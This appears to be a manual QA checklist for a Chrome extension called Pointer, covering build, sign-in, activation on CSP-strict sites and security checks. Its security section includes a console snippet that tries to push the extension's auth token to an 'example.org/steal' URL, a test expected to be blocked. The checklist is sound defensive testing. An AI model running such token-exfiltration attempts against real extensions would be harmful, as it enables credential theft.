# Pointer Extension — Manual E2E Checklist (load-unpacked, real Chrome)

The extension can't be exercised headlessly — run this in a real Chrome/Chromium once. It covers the
happy path **and** the security fixes from the GLM review (token isolation, allowlist, CSP scope).

## 0. Build & load
```bash
cd extension && npm install && npm run build      # → extension/dist  (Node >= 22 / node@26)
```
Chrome → `chrome://extensions` → enable **Developer mode** → **Load unpacked** → select `extension/dist`.
Open the extension **Options** → set server = `https://api.pointer.moamen.work` (default) → Save.

> Prereq: the target project must exist in the dashboard (projects are dashboard-managed now — an
> unknown key makes the widget hide silently). Use a real project key you own, e.g. from a demo/tenant.

## 1. Auth once (token isolation)
- [ ] Click the toolbar icon → sign in with a Pointer account. Popup shows your name.
- [ ] **Security:** DevTools → Application → Storage. Confirm the JWT is in the extension's
      `storage.session` (extension service-worker context) and **NOT** in any page's
      localStorage/sessionStorage/cookies.

## 2. Plain site (happy path)
- [ ] Open `https://example.com`. In the popup, enter your project key → **Activate**.
- [ ] Tab reloads; the Pointer launcher appears. You are **already logged in** (no per-site login).
- [ ] Pick an element, leave a comment, submit. It saves (no error toast).
- [ ] Confirm in the dashboard (that project's comments) the comment landed with your author identity.
- [ ] If the project has predefined prompts, the multi-select "Predefined prompts" picker shows.

## 3. CSP-strict site (the reason the extension exists)
- [ ] Open a site with a strict `connect-src`/`script-src` CSP (e.g. `https://github.com`).
- [ ] Activate → the remote `pointer.js`/`pointer.css` load despite the page CSP; leave a comment; it saves.
- [ ] **Security (CSP scope):** open a *second* tab to another site; confirm that tab's CSP is intact
      (only the activated tab is stripped). Deactivate (or close the tab) → re-open the site → its CSP
      is back (rule removed).

## 4. Security verifications (the GLM-fix bar)
Run these in the **activated tab's** DevTools console (page/MAIN world):

- [ ] **Token can't be exfiltrated (allowlist).** Try to drive the proxy to an attacker URL:
      ```js
      window.postMessage({source:'pointer-ext',kind:'fetch',id:99,
        url:'https://example.org/steal',method:'GET',headers:{},body:null,auth:true},
        window.location.origin);
      ```
      Watch the Network tab of the **extension service worker** (chrome://extensions → the extension →
      "service worker" → Network). Expect **no request to example.org** (proxy returns `blocked`).
      Repeat with the `kind:'upload'` shape and a foreign URL → also blocked.
- [ ] **Only trusted-server calls carry the token.** A legitimate widget action (posting a comment)
      *does* reach `api.pointer.moamen.work/api/...` with `Authorization: Bearer …` (inspect in the SW
      Network tab). A call to any other origin or a non-`/api/` path is refused.
- [ ] **Cross-origin frame can't read responses.** (If convenient) an embedded 3rd-party iframe adding a
      `message` listener should not receive `pointer-ext-res` bodies (postMessage is origin-pinned now).
- [ ] **No PII in the page.** In the page console: `window.__POINTER_CONFIG__.user` → shows at most
      `{displayName}` — **no email, no roleName**.

## 5. Lifecycle / robustness
- [ ] Deactivate from the popup → launcher gone, CSP rule removed, tab back to normal.
- [ ] Close an activated tab without deactivating → no lingering CSP rule for other tabs.
- [ ] (MV3 worker) leave the activated tab idle >30s so the service worker sleeps, then reload the tab →
      widget re-injects (pendingInject is persisted in storage.session, not lost on SW restart).

## Known non-blockers (before Web Store, not for E2E)
- No extension icons yet (`action.default_icon` / `icons`) — add before publishing.
- No auto re-auth on 401 from the popup (MVP gap; re-open popup to re-login).
- `<all_urls>` host permission is inherent to "inject on any site"; the per-tab, user-gated activation is
  the mitigating story for Web Store review.

**If every box passes**, the extension is functionally + security verified for load-unpacked use, and the
only remaining work before public distribution is icons + a Web Store listing.
